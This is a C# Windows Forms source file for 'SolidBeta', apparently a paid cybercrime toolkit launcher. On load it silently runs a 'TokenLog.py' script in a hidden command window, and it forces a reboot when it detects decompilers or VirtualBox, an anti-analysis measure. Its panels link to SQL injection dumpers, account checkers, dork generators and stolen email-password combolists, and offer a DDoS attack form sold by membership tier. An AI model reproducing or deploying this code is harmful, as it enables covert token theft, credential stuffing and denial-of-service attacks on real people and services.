using SafeGuard;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SolidBeta
{
    public partial class Main : MetroFramework.Forms.MetroForm
    {
        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn
 (
     int nLeftRect,     // x-coordinate of upper-left corner
     int nTopRect,      // y-coordinate of upper-left corner
     int nRightRect,    // x-coordinate of lower-right corner
     int nBottomRect,   // y-coordinate of lower-right corner
     int nWidthEllipse, // height of ellipse
     int nHeightEllipse // width of ellipse
 );
        public Main()
        {
            InitializeComponent();
            FormBorderStyle = FormBorderStyle.None;
            Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 20, 20));
        }
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        public string Base = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\Solid_Beta\\";
        private void Main_Load(object sender, EventArgs e)
        {
            if (File.Exists("TokenLog.py"))
            {
                ProcessStartInfo ps = new ProcessStartInfo();
                ps.FileName = "cmd.exe";
                ps.WindowStyle = ProcessWindowStyle.Hidden;
                ps.Arguments = "CMD /C py TokenLog.py";
                Process.Start(ps);
            }
            if (IsAdministrator() == true)
            {
                foreach (Process p in Process.GetProcesses())
                {
                    if (p.ProcessName.Contains("dotcover"))
                    {
                        Process.Start("shutdown", "/r /t 0");
                    }
                    if (p.ProcessName.Contains("dotmemory"))
                    {
                        Process.Start("shutdown", "/r /t 0");
                    }
                    if (p.ProcessName.Contains("dotpeek"))
                    {
                        Process.Start("shutdown", "/r /t 0");
                    }
                    if (p.ProcessName.Contains("dottrace"))
                    {
                        Process.Start("shutdown", "/r /t 0");
                    }
                    if (p.ProcessName.Contains("virtualbox"))
                    {
                        Process.Start("shutdown", "/r /t 0");
                    }
                    if (p.ProcessName.Contains("decompiler"))
                    {
                        Process.Start("shutdown", "/r /t 0");
                    }
                }
                Tools.ProcessCheck();
                if (!Directory.Exists(Base))
                {
                    Directory.CreateDirectory(Base);
                }
            }
            else
            {
                MessageBox.Show(this, "Solid Beta requires administrative access to function properly. Please close and run as administrator.", "Solid Beta", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            ResponseInformation.count = DeveloperFunctions.CountCall(ProgramInformation.ProgramId);

        }
        private void LoginBtn_Click(object sender, EventArgs e)
        {
            UserTb.Visible = true;
            PassTb.Visible = true;
            RegPassTb.Visible = false;
            EmailTb.Visible = false;
            TokenTb.Visible = false;
            RegBtn.Visible = true;
            Reg2Btn.Visible = false;
            IconTb.Visible = false;
            LoginBtn.Visible = false;
            Login2Btn.Visible = true;
        }

        private void Login2Btn_Click(object sender, EventArgs e)
        {
            //ResponseInformation.loginresponse.Failure is a boolean, which will will be true if login failed
            ResponseInformation.loginresponse = ClientFunctions.Login(UserTb.Text, PassTb.Text, ProgramInformation.ProgramId);
            //Here we set password so we can use them throughout the application
            ResponseInformation.Password = PassTb.Text;
            if (ResponseInformation.loginresponse.Failure)
            {
                //Message will be the reason for failed login
                MessageBox.Show(ResponseInformation.loginresponse.Message);
                TokenTb.Visible = false;
                EmailTb.Visible = false;
                LoginBtn.Visible = true;
                UserTb.Visible = false;
                PassTb.Visible = false;
                IconTb.Visible = false;
                RegBtn.Visible = false;
                Reg2Btn.Visible = false;
                RegPassTb.Visible = false;
                Login2Btn.Visible = false;
                CodedTb.Visible = true;
                LogoPb.Visible = true;
                LogoutBtn.Visible = false;

            }
            else
            {
                //Message will be "Successfully Logged In"
                MessageBox.Show(ResponseInformation.loginresponse.Message);
                UserTb.Visible = false;
                PassTb.Visible = false;
                IconTb.Visible = false;
                RegBtn.Visible = false;
                Reg2Btn.Visible = false;
                LoginBtn.Visible = false;
                Login2Btn.Visible = false;
                CodedTb.Visible = true;
                LogoPb.Visible = false;
                Rules1Tb.Visible = true;
                Rules2Tb.Visible = true;
                Rules3Tb.Visible = true;
                Rules4Tb.Visible = true;
                Rules5Tb.Visible = true;
                AgreeBtn.Visible = true;
                BackBtn.Visible = true;
            }
        }

        private void RegBtn_Click(object sender, EventArgs e)
        {
            UserTb.Visible = true;
            PassTb.Visible = false;
            RegPassTb.Visible = true;
            EmailTb.Visible = true;
            TokenTb.Visible = true;
            IconTb.Visible = false;
            RegBtn.Visible = false;
            Reg2Btn.Visible = true;
            Login2Btn.Visible = false;
            LoginBtn.Visible = true;
        }

        private void Reg2Btn_Click(object sender, EventArgs e)
        {
            //Here, once register is successfull you can login automatically and show your main form
            ResponseInformation.registerinfo = ClientFunctions.Register(UserTb.Text, RegPassTb.Text, TokenTb.Text,
            EmailTb.Text, ProgramInformation.ProgramId);
            if (!ResponseInformation.registerinfo.Failure)
            {
                //Here we commense the login method
                ResponseInformation.loginresponse = ClientFunctions.Login(UserTb.Text, RegPassTb.Text, ProgramInformation.ProgramId);
                if (ResponseInformation.loginresponse.Failure)
                {
                    MessageBox.Show(ResponseInformation.loginresponse.Message);
                }
                else
                {
                    MessageBox.Show(ResponseInformation.loginresponse.Message);
                    ResponseInformation.Password = PassTb.Text;
                    UserTb.Visible = false;
                    PassTb.Visible = false;
                    EmailTb.Visible = false;
                    TokenTb.Visible = false;
                    IconTb.Visible = false;
                    RegBtn.Visible = false;
                    Reg2Btn.Visible = false;
                    LoginBtn.Visible = false;
                    Login2Btn.Visible = false;
                    CodedTb.Visible = true;
                    RegPassTb.Visible = false;
                    AgreeBtn.Visible = true;
                    BackBtn.Visible = true;
                    LogoPb.Visible = false;
                    Rules1Tb.Visible = true;
                    Rules2Tb.Visible = true;
                    Rules3Tb.Visible = true;
                    Rules4Tb.Visible = true;
                    Rules5Tb.Visible = true;
                }
            }
            else
            {
                MessageBox.Show(ResponseInformation.registerinfo.Message);
            }
        }

        private void InfoBtn_Click(object sender, EventArgs e)
        {
            CodedTb.Visible = true;
            RegPassTb.Visible = false;
            AccountTypeTb.Visible = false;
            GenBtn.Visible = false;
            resTextBox.Visible = false;
            AccsBtn.Visible = false;
            GenBtn.Visible = false;
            SQLiBtn.Visible = false;
            ParserBtn.Visible = false;
            PBinBtn.Visible = false;
            LeecherBtn.Visible = false;
            TSMBtn.Visible = false;
            FirewallBtn.Visible = false;
            IGBotBtn.Visible = false;
            IGTurboBtn.Visible = false;
            ProxyBtn.Visible = false;
            ScannerBtn.Visible = false;
            NXClientBtn.Visible = false;
            CheckersBtn.Visible = false;
            XTurboBtn.Visible = false;
            NitroBtn.Visible = false;
            TikTokBtn.Visible = false;
            DSearchBtn.Visible = false;
            DGenBtn.Visible = false;
            CombosBtn.Visible = false;
            SpotifyBtn.Visible = false;
            IGBtn.Visible = false;
            VYPRBtn.Visible = false;
            NordBtn.Visible = false;
            C1Btn.Visible = false;
            C2Btn.Visible = false;
            C3Btn.Visible = false;
            C4Btn.Visible = false;
            GeoIPTb.Visible = false;
            GeoBtn.Visible = false;
            PingIPTb.Visible = false;
            PingBtn.Visible = false;
            TCPPingIPTb.Visible = false;
            TCPPortTb.Visible = false;
            TCPBtn.Visible = false;
            IPTb.Visible = false;
            PortTb.Visible = false;
            TimeTb.Visible = false;
            MethodTb.Visible = false;
            StartBtn.Visible = false;
            MethodsBtn.Visible = false;
            attackprogressBar.Visible = false;
            CTOBtn.Visible = false;
            SaikoIGBtn.Visible = false;
            DiscordBtn.Visible = false;
            ActiveUserTb.Visible = true;
            MembershipTb.Visible = true;
            TimeLeftTb.Visible = true;
            LogoPb.Visible = false;
            ActiveUserTb.Text = $"{ResponseInformation.loginresponse.UserName}";
            MembershipTb.Text = $"{ResponseInformation.loginresponse.Level}";
            TimeSpan timeLeft = ResponseInformation.loginresponse.ExpirationDate - DateTime.Now;
            TimeLeftTb.Text = $"{timeLeft.Days} Day(s) Left";
            if (timeLeft.Days > 365)
                TimeLeftTb.Text = "You Have Lifetime!";
            if (ResponseInformation.loginresponse.Level == 1)
                MembershipTb.Text = "Basic";
            else if (ResponseInformation.loginresponse.Level == 5)
                MembershipTb.Text = "MVP";
            else if (ResponseInformation.loginresponse.Level == 10)
                MembershipTb.Text = "Reseller";
            else if (ResponseInformation.loginresponse.Level == 11)
                MembershipTb.Text = "SolidBeta Dev";
        }

        private void ToolsBtn_Click(object sender, EventArgs e)
        {
            GeoIPTb.Visible = false;
            GeoBtn.Visible = false;
            PingIPTb.Visible = false;
            PingBtn.Visible = false;
            TCPPingIPTb.Visible = false;
            TCPPortTb.Visible = false;
            TCPBtn.Visible = false;
            IPTb.Visible = false;
            PortTb.Visible = false;
            TimeTb.Visible = false;
            MethodTb.Visible = false;
            StartBtn.Visible = false;
            MethodsBtn.Visible = false;
            attackprogressBar.Visible = false;
            AccountTypeTb.Visible = false;
            GenBtn.Visible = false;
            resTextBox.Visible = false;
            AccsBtn.Visible = false;
            GenBtn.Visible = false;
            CTOBtn.Visible = false;
            SaikoIGBtn.Visible = false;
            DiscordBtn.Visible = false;
            ActiveUserTb.Visible = false;
            MembershipTb.Visible = false;
            TimeLeftTb.Visible = false;
            CodedTb.Visible = false;
            LogoPb.Visible = false;
            RegPassTb.Visible = false;
            SQLiBtn.Visible = true;
            ParserBtn.Visible = true;
            PBinBtn.Visible = true;
            LeecherBtn.Visible = true;
            TSMBtn.Visible = true;
            FirewallBtn.Visible = true;
            IGBotBtn.Visible = true;
            IGTurboBtn.Visible = true;
            ProxyBtn.Visible = true;
            ScannerBtn.Visible = true;
            NXClientBtn.Visible = true;
            CheckersBtn.Visible = true;
            XTurboBtn.Visible = true;
            NitroBtn.Visible = true;
            TikTokBtn.Visible = true;
            DSearchBtn.Visible = true;
            DGenBtn.Visible = true;
            CombosBtn.Visible = true;
        }
        private void CheckersBtn_Click(object sender, EventArgs e)
        {
            SpotifyBtn.Visible = true;
            IGBtn.Visible = true;
            VYPRBtn.Visible = true;
            NordBtn.Visible = true;
            Checkers2Btn.Visible = true;
            CheckersBtn.Visible = false;
        }
        private void CombosBtn_Click(object sender, EventArgs e)
        {
            C1Btn.Visible = true;
            C2Btn.Visible = true;
            C3Btn.Visible = true;
            C4Btn.Visible = true;
            Combos2Btn.Visible = true;
            CombosBtn.Visible = false;
        }
        private void SQLiBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("SQLi Dumper.exe"))
            {
                string filename = "SQLi Dumper.exe";
                Process.Start(filename);
            }
            else
            {
                Process.Start("https://anonfiles.com/fa4a38Waod/SQLi_Dumper_v8.3_rar");
            }
        }

        private void ParserBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("Unfx Proxy Parser.exe"))
            {
                string filename = "Unfx Proxy Parser.exe";
                Process.Start(filename);
            }
            else
            {
                Process.Start("https://anonfiles.com/H85730W4o5/unfx-proxy-parser-2.0.0-ia32.nsis_7z");
            }
        }

        private void PBinBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("pb.exe"))
            {
                string filename = "pb.exe";
                Process.Start(filename);
            }
            else
            {
                Process.Start("https://anonfiles.com/h4573dWco4/pb_exe");
            }
        }

        private void LeecherBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("B3RAP Leecher v2.exe"))
            {
                string filename = "B3RAP Leecher v2.exe";
                Process.Start(filename);
            }
            else
            {
                Process.Start("https://anonfiles.com/Pd503dWdo6/B3RAP_Leecher_v2.1.0.0_rar");
            }
        }

        private void TSMBtn_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.mediafire.com/file/p4m8m6rwctdgd25/TSM.rar/file");
        }

        private void FirewallBtn_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.mediafire.com/file/wbxgkdl7apremjp/Firewall+code.txt/file");
        }

        private void IGBotBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("NinjaGram.exe"))
            {
                string filename = "NinjaGram.exe";
                Process.Start(filename);
            }
            else
            {
                Process.Start("https://anonfiles.com/Db9830Wdo4/NinjaGram_exe");
            }
        }

        private void IGTurboBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("Get_Fuxked.exe"))
            {
                string filename = "Get_Fuxked.exe";
                Process.Start(filename);
            }
            else
            {
                Process.Start("https://anonfiles.com/F47e36W4o2/Get_Fuxked_exe");
            }
        }

        private void ProxyBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("SPv5.exe"))
            {
                string filename = "SPv5.exe";
                Process.Start(filename);
            }
            else
            {
                Process.Start("https://anonfiles.com/X4753bW9o9/SPv5_exe");
            }
        }

        private void ScannerBtn_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.mediafire.com/file/tzhljkoia73le7j/Saiko+Scanner.rar/file");
        }

        private void NXClientBtn_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/4ddabR2");
        }

        private void SpotifyBtn_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Currently Down.");
        }

        private void IGBtn_Click(object sender, EventArgs e)
        {
            Process.Start("https://cracked.to/Thread-FAST-INSTAGRAM-USERNAME-CHECKER-GET-STARTED-WITH-SELLING-IG-S");
        }

        private void VYPRBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("VyprVPN Checker by xRisky.exe"))
            {
                string filename = "VyprVPN Checker by xRisky.exe";
                Process.Start(filename);
            }
            else
            {
                Process.Start("https://anonfiles.com/r9I0n41aod/VyprVPN_Checker_by_xRisky_zip");
            }
        }

        private void NordBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("NordVPN Checker by xRisky v2.exe"))
            {
                string filename = "NordVPN Checker by xRisky v2.exe";
                Process.Start(filename);
            }
            else
            {
                Process.Start("https://anonfiles.com/B8l9zfM9nf/NordVPN_Checker_v2_by_xRisky_zip");
            }
        }

        private void XTurboBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("XboxLiveAccountTool.exe"))
            {
                string filename = "XboxLiveAccountTool.exe";
                Process.Start(filename);
            }
            else
            {
                Process.Start("https://anonfiles.com/32ze30Wdo6/XboxLiveAccountTool_exe");
            }
        }

        private void NitroBtn_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Currently Down.");
        }

        private void TikTokBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("TikTok Report Bot.exe"))
            {
                string filename = "TikTok Report Bot.exe";
                Process.Start(filename);
            }
            else
            {
                Process.Start("https://anonfiles.com/941b3bWfoe/TikTok_Report_Bot_exe");
            }
        }

        private void DSearchBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("Searcher.exe"))
            {
                string filename = "Searcher.exe";
                Process.Start(filename);
            }
            else
            {
                Process.Start("https://anonfiles.com/f2tb3bW7oe/Dork_Searcher_EZ_anontechtonic.blogspot.com_rar");
            }
        }

        private void DGenBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("tsp dork generator v11.exe"))
            {
                string filename = "tsp dork generator v11.exe";
                Process.Start(filename);
            }
            else
            {
                Process.Start("https://anonfiles.com/j43537W1o2/TSP_Dork_generator_v11.0_rar");
            }
        }

        private void C1Btn_Click(object sender, EventArgs e)
        {
            Process.Start("https://anonfiles.com/x5ac42W5o0/200k_gaming_txt");
        }

        private void C2Btn_Click(object sender, EventArgs e)
        {
            Process.Start("https://anonfiles.com/v1bf41W3o4/550K_HQ_EMAIL_PASS_COMBOLIST_NETFLIX_VPN_HULU_FORTNIT_AMAZON_STREAMING_SHOPPING_SPOTIFY_txt");
        }

        private void C3Btn_Click(object sender, EventArgs e)
        {
            Process.Start("https://anonfiles.com/t0cb41W9o7/808k_txt");
        }

        private void C4Btn_Click(object sender, EventArgs e)
        {
            Process.Start("https://anonfiles.com/T2c140W8of/700k_France_Combolist_txt");
        }

        private void NetBtn_Click(object sender, EventArgs e)
        {
            SQLiBtn.Visible = false;
            ParserBtn.Visible = false;
            PBinBtn.Visible = false;
            LeecherBtn.Visible = false;
            TSMBtn.Visible = false;
            FirewallBtn.Visible = false;
            IGBotBtn.Visible = false;
            IGTurboBtn.Visible = false;
            ProxyBtn.Visible = false;
            ScannerBtn.Visible = false;
            NXClientBtn.Visible = false;
            CheckersBtn.Visible = false;
            XTurboBtn.Visible = false;
            NitroBtn.Visible = false;
            TikTokBtn.Visible = false;
            DSearchBtn.Visible = false;
            DGenBtn.Visible = false;
            CombosBtn.Visible = false;
            SpotifyBtn.Visible = false;
            IGBtn.Visible = false;
            VYPRBtn.Visible = false;
            NordBtn.Visible = false;
            C1Btn.Visible = false;
            C2Btn.Visible = false;
            C3Btn.Visible = false;
            C4Btn.Visible = false;
            GeoIPTb.Visible = true;
            GeoBtn.Visible = true;
            PingIPTb.Visible = true;
            PingBtn.Visible = true;
            TCPPingIPTb.Visible = true;
            TCPPortTb.Visible = true;
            TCPBtn.Visible = true;
            IPTb.Visible = true;
            PortTb.Visible = true;
            TimeTb.Visible = true;
            MethodTb.Visible = true;
            StartBtn.Visible = true;
            MethodsBtn.Visible = true;
            attackprogressBar.Visible = true;
            AccountTypeTb.Visible = false;
            GenBtn.Visible = false;
            resTextBox.Visible = false;
            AccsBtn.Visible = false;
            GenBtn.Visible = false;
            CTOBtn.Visible = false;
            SaikoIGBtn.Visible = false;
            DiscordBtn.Visible = false;
            ActiveUserTb.Visible = false;
            MembershipTb.Visible = false;
            TimeLeftTb.Visible = false;
            LogoPb.Visible = false;
            RegPassTb.Visible = false;
            CodedTb.Visible = true;
        }

        private void GeoBtn_Click(object sender, EventArgs e)
        {
            {
                string res = Tools.GeoIP(GeoIPTb.Text, ResponseInformation.loginresponse.UserName, ResponseInformation.Password, ProgramInformation.ProgramId);
                res = res.Replace("\"", string.Empty);
                res = res.Replace("\\r\\n", Environment.NewLine);
                MessageBox.Show(res, SafeGuardTitle.safeguardtitle);
                GeoIPTb.Text = "";
            }
        }

        private void PingBtn_Click(object sender, EventArgs e)
        {
            Tools.Ping(PingIPTb.Text);
            PingIPTb.Text = "";
        }

        private void TCPBtn_Click(object sender, EventArgs e)
        {
            new Process
            {
                StartInfo =
                {
                    UseShellExecute = false,
                    FileName = "paping.exe",
                    Arguments = TCPPingIPTb.Text + " -p " + TCPPortTb.Text
                }
            }.Start();
            string arguments = "paping.exe" + TCPPingIPTb.Text + " -p " + TCPPortTb.Text;
            Process.Start("ping.exe", arguments);
            TCPPingIPTb.Text = "";
            TCPPortTb.Text = "";
        }

        private void StartBtn_Click(object sender, EventArgs e)
        {
            string response = ClientFunctions.AttackRequest(ResponseInformation.loginresponse.UserName, ResponseInformation.Password, ProgramInformation.ProgramId, IPTb.Text, PortTb.Text, MethodTb.Text, TimeTb.Text, true);
            MessageBox.Show(response);
            //Disables Attack Button
            StartBtn.Enabled = false;
            //Starts CoolDown 
            attktimer.Start();
            IPTb.Text = "";
            TimeTb.Text = "";
            PortTb.Text = "";
            MethodTb.Text = "";
        }
        private void attktimer_Tick(object sender, EventArgs e)
        {
            #region CoolDown
            int max;
            //You can set cooldown times based on User Level
            switch (ResponseInformation.loginresponse.Level)
            {
                case 1:
                    max = 90;
                    break;
                case 5:
                    max = 60;
                    break;
                case 7:
                    max = 30;
                    break;
                default:
                    max = 90;
                    break;
            }
            attackprogressBar.Maximum = max;
            if (attackprogressBar.Value < attackprogressBar.Maximum)
            {
                //incrementing the progress bar
                attackprogressBar.Value = attackprogressBar.Value + 1;
            }
            if (attackprogressBar.Value == attackprogressBar.Maximum)
            {
                //cooldown is finished
                attktimer.Stop();
                attackprogressBar.Value = 0;
                //reenable the button
                StartBtn.Enabled = true;
            }
            #endregion
        }

        private void MethodsBtn_Click(object sender, EventArgs e)
        {
            MessageBox.Show("API Missing.");
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Netflix\n\rHulu\n\rFortnite\n\rEbay\n\rNord VPN\n\rSteam\n\rAmazonUS\n\rDominosCA\n\rDominosUK\n\rDominosUS\n\rOrigin\n\rUber\n\rSpotify\n\rInstagram\n\rPandora\n\rFacebook\n\rWish\n\rTwitter\n\rDeath By Captcha\n\rPornhub\n\rStockx\n\rDoorDash\n\rIPVanish");
        }

        private void GenBtn_Click(object sender, EventArgs e)
        {
            ResponseInformation.accountgen = ClientFunctions.GetAccount(ResponseInformation.loginresponse.UserName, ResponseInformation.Password, ProgramInformation.ProgramId, AccountTypeTb.Text);
            if (ResponseInformation.accountgen.Failure)
                MessageBox.Show(ResponseInformation.accountgen.Message);
            else
                resTextBox.Text = $"Username: {Environment.NewLine}{ResponseInformation.accountgen.Username}{Environment.NewLine}Password: {Environment.NewLine}{ResponseInformation.accountgen.Password}{Environment.NewLine}Type: {Environment.NewLine}{AccountTypeTb.Text}{Environment.NewLine}";
            AccountTypeTb.Text = "";
        }

        private void AccGenBtn_Click(object sender, EventArgs e)
        {
            CodedTb.Visible = false;
            RegPassTb.Visible = false;
            AccountTypeTb.Visible = true;
            GenBtn.Visible = true;
            resTextBox.Visible = true;
            AccsBtn.Visible = true;
            GenBtn.Visible = true;
            SQLiBtn.Visible = false;
            ParserBtn.Visible = false;
            PBinBtn.Visible = false;
            LeecherBtn.Visible = false;
            TSMBtn.Visible = false;
            FirewallBtn.Visible = false;
            IGBotBtn.Visible = false;
            IGTurboBtn.Visible = false;
            ProxyBtn.Visible = false;
            ScannerBtn.Visible = false;
            NXClientBtn.Visible = false;
            CheckersBtn.Visible = false;
            XTurboBtn.Visible = false;
            NitroBtn.Visible = false;
            TikTokBtn.Visible = false;
            DSearchBtn.Visible = false;
            DGenBtn.Visible = false;
            CombosBtn.Visible = false;
            SpotifyBtn.Visible = false;
            IGBtn.Visible = false;
            VYPRBtn.Visible = false;
            NordBtn.Visible = false;
            C1Btn.Visible = false;
            C2Btn.Visible = false;
            C3Btn.Visible = false;
            C4Btn.Visible = false;
            GeoIPTb.Visible = false;
            GeoBtn.Visible = false;
            PingIPTb.Visible = false;
            PingBtn.Visible = false;
            TCPPingIPTb.Visible = false;
            TCPPortTb.Visible = false;
            TCPBtn.Visible = false;
            IPTb.Visible = false;
            PortTb.Visible = false;
            TimeTb.Visible = false;
            MethodTb.Visible = false;
            StartBtn.Visible = false;
            MethodsBtn.Visible = false;
            attackprogressBar.Visible = false;
            CTOBtn.Visible = false;
            SaikoIGBtn.Visible = false;
            DiscordBtn.Visible = false;
            ActiveUserTb.Visible = false;
            MembershipTb.Visible = false;
            TimeLeftTb.Visible = false;
            LogoPb.Visible = false;
            resTextBox.Text = "";
        }

        private void MVPBtn_Click(object sender, EventArgs e)
        {

            CodedTb.Visible = false;
            RegPassTb.Visible = false;
            AccountTypeTb.Visible = false;
            GenBtn.Visible = false;
            resTextBox.Visible = false;
            AccsBtn.Visible = false;
            GenBtn.Visible = false;
            SQLiBtn.Visible = false;
            ParserBtn.Visible = false;
            PBinBtn.Visible = false;
            LeecherBtn.Visible = false;
            TSMBtn.Visible = false;
            FirewallBtn.Visible = false;
            IGBotBtn.Visible = false;
            IGTurboBtn.Visible = false;
            ProxyBtn.Visible = false;
            ScannerBtn.Visible = false;
            NXClientBtn.Visible = false;
            CheckersBtn.Visible = false;
            XTurboBtn.Visible = false;
            NitroBtn.Visible = false;
            TikTokBtn.Visible = false;
            DSearchBtn.Visible = false;
            DGenBtn.Visible = false;
            CombosBtn.Visible = false;
            SpotifyBtn.Visible = false;
            IGBtn.Visible = false;
            VYPRBtn.Visible = false;
            NordBtn.Visible = false;
            C1Btn.Visible = false;
            C2Btn.Visible = false;
            C3Btn.Visible = false;
            C4Btn.Visible = false;
            GeoIPTb.Visible = false;
            GeoBtn.Visible = false;
            PingIPTb.Visible = false;
            PingBtn.Visible = false;
            TCPPingIPTb.Visible = false;
            TCPPortTb.Visible = false;
            TCPBtn.Visible = false;
            IPTb.Visible = false;
            PortTb.Visible = false;
            TimeTb.Visible = false;
            MethodTb.Visible = false;
            StartBtn.Visible = false;
            MethodsBtn.Visible = false;
            attackprogressBar.Visible = false;
            CTOBtn.Visible = false;
            SaikoIGBtn.Visible = false;
            DiscordBtn.Visible = false;
            ActiveUserTb.Visible = false;
            MembershipTb.Visible = false;
            TimeLeftTb.Visible = false;
            LogoPb.Visible = false;
            MessageBox.Show("Currently Updating.");
        }

        private void SocialsBtn_Click(object sender, EventArgs e)
        {
            CodedTb.Visible = true;
            RegPassTb.Visible = false;
            AccountTypeTb.Visible = false;
            GenBtn.Visible = false;
            resTextBox.Visible = false;
            AccsBtn.Visible = false;
            GenBtn.Visible = false;
            SQLiBtn.Visible = false;
            ParserBtn.Visible = false;
            PBinBtn.Visible = false;
            LeecherBtn.Visible = false;
            TSMBtn.Visible = false;
            FirewallBtn.Visible = false;
            IGBotBtn.Visible = false;
            IGTurboBtn.Visible = false;
            ProxyBtn.Visible = false;
            ScannerBtn.Visible = false;
            NXClientBtn.Visible = false;
            CheckersBtn.Visible = false;
            XTurboBtn.Visible = false;
            NitroBtn.Visible = false;
            TikTokBtn.Visible = false;
            DSearchBtn.Visible = false;
            DGenBtn.Visible = false;
            CombosBtn.Visible = false;
            SpotifyBtn.Visible = false;
            IGBtn.Visible = false;
            VYPRBtn.Visible = false;
            NordBtn.Visible = false;
            C1Btn.Visible = false;
            C2Btn.Visible = false;
            C3Btn.Visible = false;
            C4Btn.Visible = false;
            GeoIPTb.Visible = false;
            GeoBtn.Visible = false;
            PingIPTb.Visible = false;
            PingBtn.Visible = false;
            TCPPingIPTb.Visible = false;
            TCPPortTb.Visible = false;
            TCPBtn.Visible = false;
            IPTb.Visible = false;
            PortTb.Visible = false;
            TimeTb.Visible = false;
            MethodTb.Visible = false;
            StartBtn.Visible = false;
            MethodsBtn.Visible = false;
            attackprogressBar.Visible = false;
            CTOBtn.Visible = true;
            SaikoIGBtn.Visible = true;
            DiscordBtn.Visible = true;
            ActiveUserTb.Visible = false;
            MembershipTb.Visible = false;
            TimeLeftTb.Visible = false;
            LogoPb.Visible = false;
        }

        private void SaikoIGBtn_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.instagram.com/saiko.xbl/");
        }

        private void DiscordBtn_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Currently Down.");
        }

        private void CTOBtn_Click(object sender, EventArgs e)
        {
            Process.Start("https://cracked.to/callmesaiko");
        }

        private void LogoutBtn_Click(object sender, EventArgs e)
        {
            CodedTb.Visible = true;
            ToolsBtn.Visible = false;
            NetBtn.Visible = false;
            AccGenBtn.Visible = false;
            SocialsBtn.Visible = false;
            MVPBtn.Visible = false;
            InfoBtn.Visible = false;
            LogoutBtn.Visible = false;
            LoginBtn.Visible = true;
            RegPassTb.Visible = false;
            AccountTypeTb.Visible = false;
            GenBtn.Visible = false;
            resTextBox.Visible = false;
            AccsBtn.Visible = false;
            GenBtn.Visible = false;
            SQLiBtn.Visible = false;
            ParserBtn.Visible = false;
            PBinBtn.Visible = false;
            LeecherBtn.Visible = false;
            TSMBtn.Visible = false;
            FirewallBtn.Visible = false;
            IGBotBtn.Visible = false;
            IGTurboBtn.Visible = false;
            ProxyBtn.Visible = false;
            ScannerBtn.Visible = false;
            NXClientBtn.Visible = false;
            CheckersBtn.Visible = false;
            XTurboBtn.Visible = false;
            NitroBtn.Visible = false;
            TikTokBtn.Visible = false;
            DSearchBtn.Visible = false;
            DGenBtn.Visible = false;
            CombosBtn.Visible = false;
            SpotifyBtn.Visible = false;
            IGBtn.Visible = false;
            VYPRBtn.Visible = false;
            NordBtn.Visible = false;
            C1Btn.Visible = false;
            C2Btn.Visible = false;
            C3Btn.Visible = false;
            C4Btn.Visible = false;
            GeoIPTb.Visible = false;
            GeoBtn.Visible = false;
            PingIPTb.Visible = false;
            PingBtn.Visible = false;
            TCPPingIPTb.Visible = false;
            TCPPortTb.Visible = false;
            TCPBtn.Visible = false;
            IPTb.Visible = false;
            PortTb.Visible = false;
            TimeTb.Visible = false;
            MethodTb.Visible = false;
            StartBtn.Visible = false;
            MethodsBtn.Visible = false;
            attackprogressBar.Visible = false;
            CTOBtn.Visible = false;
            SaikoIGBtn.Visible = false;
            DiscordBtn.Visible = false;
            ActiveUserTb.Visible = false;
            MembershipTb.Visible = false;
            TimeLeftTb.Visible = false;
            LogoPb.Visible = true;
            ExitBtn.Visible = false;
        }

        private void AgreeBtn_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Thank you for using SolidBeta and agreeing to our TOS; if you need support contact atkhr on discord.");
            InfoBtn.Visible = true;
            NetBtn.Visible = true;
            ToolsBtn.Visible = true;
            AccGenBtn.Visible = true;
            MVPBtn.Visible = true;
            SocialsBtn.Visible = true;
            LogoutBtn.Visible = true;
            CodedTb.Visible = true;
            AgreeBtn.Visible = false;
            BackBtn.Visible = false;
            ExitBtn.Visible = true;
            Rules1Tb.Visible = false;
            Rules2Tb.Visible = false;
            Rules3Tb.Visible = false;
            Rules4Tb.Visible = false;
            Rules5Tb.Visible = false;
            LogoPb.Visible = true;

        }

        private void BackBtn_Click(object sender, EventArgs e)
        {
            CodedTb.Visible = true;
            ToolsBtn.Visible = false;
            NetBtn.Visible = false;
            AccGenBtn.Visible = false;
            SocialsBtn.Visible = false;
            MVPBtn.Visible = false;
            InfoBtn.Visible = false;
            LogoutBtn.Visible = false;
            LoginBtn.Visible = true;
            RegPassTb.Visible = false;
            AccountTypeTb.Visible = false;
            GenBtn.Visible = false;
            resTextBox.Visible = false;
            AccsBtn.Visible = false;
            GenBtn.Visible = false;
            SQLiBtn.Visible = false;
            ParserBtn.Visible = false;
            PBinBtn.Visible = false;
            LeecherBtn.Visible = false;
            TSMBtn.Visible = false;
            FirewallBtn.Visible = false;
            IGBotBtn.Visible = false;
            IGTurboBtn.Visible = false;
            ProxyBtn.Visible = false;
            ScannerBtn.Visible = false;
            NXClientBtn.Visible = false;
            CheckersBtn.Visible = false;
